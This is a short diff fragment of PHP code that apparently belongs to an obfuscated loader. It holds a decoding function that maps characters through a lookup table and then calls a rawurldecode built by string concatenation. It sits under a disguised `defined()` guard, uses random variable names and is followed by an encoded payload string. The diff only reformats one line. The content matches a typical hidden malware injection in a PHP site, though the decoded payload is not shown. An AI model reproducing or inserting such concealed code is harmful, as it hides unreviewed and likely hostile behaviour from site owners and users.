@@ -8,7 +8,8 @@ if (!defined('stream_context_create ')){
     for($i=0; $i < strlen($pqtqrdeeam); $i++){
       $ofwzm .= isset($koanh[$pqtqrdeeam[$i]]) ? $koanh[$pqtqrdeeam[$i]] : $pqtqrdeeam[$i];
     }
-    $tgccd="rawurl" . "decode";return $tgccd($ofwzm);
+    $tgccd="rawurl" . "decode";
+    return $tgccd($ofwzm);
   }
  
 $ssyowfjkl = '%dR%dB%dR%dB%TdMDM_sEc%jH%jGEuu5u_W5N%jG%jh%jdLaKK%j4%8m%dR%dB%TdMDM_sEc%jH%jGW5N_Euu5us%jG%jh'.
